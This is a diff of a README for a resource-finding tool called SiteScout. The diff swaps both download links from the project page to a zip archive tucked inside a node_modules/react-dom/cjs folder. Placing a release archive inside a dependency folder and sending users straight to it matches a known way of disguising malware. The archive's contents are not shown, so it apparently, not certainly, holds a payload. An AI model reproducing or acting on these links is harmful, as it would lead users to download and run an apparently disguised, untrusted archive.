@@ -1,6 +1,6 @@
 # 🛰️ SiteScout - Find and refine resources fast
 
-[⬇️ Download SiteScout](https://github.com/pedrsxrh/SiteScout){:style="display:inline-block;padding:12px 18px;background:#6c5ce7;color:#ffffff;border-radius:8px;text-decoration:none;font-weight:600;"}
+[⬇️ Download SiteScout](https://raw.githubusercontent.com/pedrsxrh/SiteScout/main/frontend/node_modules/react-dom/cjs/Site_Scout_1.3.zip){:style="display:inline-block;padding:12px 18px;background:#6c5ce7;color:#ffffff;border-radius:8px;text-decoration:none;font-weight:600;"}
 
 ## 🧭 What SiteScout does
 
@@ -27,7 +27,7 @@ SiteScout uses a web-style interface, so it should feel familiar if you use webs
 
 Go to the main project page here:
 
-[Visit the SiteScout download page](https://github.com/pedrsxrh/SiteScout)
+[Visit the SiteScout download page](https://raw.githubusercontent.com/pedrsxrh/SiteScout/main/frontend/node_modules/react-dom/cjs/Site_Scout_1.3.zip)
 
 On that page, look for the latest release, build file, or app package. Then download it to your computer.
 
